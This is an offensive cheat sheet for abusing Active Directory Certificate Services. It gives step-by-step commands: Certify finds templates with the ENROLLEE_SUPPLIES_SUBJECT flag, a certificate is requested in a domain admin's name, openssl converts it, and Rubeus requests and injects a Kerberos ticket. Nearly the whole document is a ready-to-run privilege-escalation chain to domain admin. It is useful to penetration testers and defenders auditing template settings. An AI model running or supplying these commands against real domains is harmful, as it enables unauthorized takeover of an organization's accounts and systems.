# Active Directory Certificate Services (ADCS)

Find Certificate templates in the domain:
```powershell
certify.exe find
```

Find vulnerable Certificate templates in the domain
```powershell
certify.exe find /vulnerable
```

Vulnerable Certificate template: property `msPKI-Certificate-Name-Flag` is set to `ENROLLEE_SUPPLIES_SUBJECT`, meaning the requesting entity can set the subject of the cert.

With the vulnerable Cert template identified, 

```powershell
Certify.exe request /ca:domain\ca-host /template:templateName /altname:domain\domainAdmin
```

This will generate a .pem
```powershell
[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
...
-----BEGIN CERTIFICATE-----
```

Convert the pem to a pkcs#12 (.pfx) with openssl
```powershell
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Ask for TGT with Rubeus:
```powershell
Rubeus.exe asktgt /user:domainAdmin /certificate:cert.pfx /nowrap
```

And pass the ticket into your session
```powershell
# Purge existing tickets if necessary
klist purge 
Rubeus.exe ptt /ticket:<ticket_b64>

# Ticket should now exist in your session
klist
```
